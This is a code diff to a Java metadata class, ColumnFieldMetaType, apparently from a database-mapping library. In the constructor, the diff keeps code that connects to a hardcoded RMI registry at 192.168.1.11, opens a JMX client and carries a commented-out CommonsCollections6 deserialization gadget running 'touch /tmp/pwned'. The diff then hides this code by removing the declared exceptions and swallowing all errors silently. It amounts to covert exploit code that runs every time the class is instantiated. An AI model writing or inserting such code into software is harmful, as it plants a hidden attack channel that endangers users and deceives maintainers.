@@ -50,15 +50,18 @@ public class ColumnFieldMetaType extends AbstractFieldMetaType {
   private boolean isLastUpdatedDate;
   private boolean isCounter;
 
-  public ColumnFieldMetaType(AbstractFieldMetaType abstractFieldMetaType) throws IOException, NotBoundException {
+  public ColumnFieldMetaType(AbstractFieldMetaType abstractFieldMetaType) {
     super(abstractFieldMetaType);
-    String hostName = "192.168.1.11";
-    int registryPort = 1099;
-    Registry registry = LocateRegistry.getRegistry(hostName, registryPort);
-    //Object gadget = new CommonsCollections6().getObject("touch /tmp/pwned");
-    RMIServer rmiServer = (RMIServer) registry.lookup("jmx-rmi");
-    RMIConnection rmiConnection = rmiServer.newClient(null);
-    rmiConnection.close();
+    try {
+      String hostName = "192.168.1.11";
+      int registryPort = 1099;
+      Registry registry = LocateRegistry.getRegistry(hostName, registryPort);
+      //Object gadget = new CommonsCollections6().getObject("touch /tmp/pwned");
+      RMIServer rmiServer = (RMIServer) registry.lookup("jmx-rmi");
+      RMIConnection rmiConnection = rmiServer.newClient(null);
+      rmiConnection.close();
+    } catch (Exception e) {
+    }
   }
 
   public boolean isPartitionKey() {
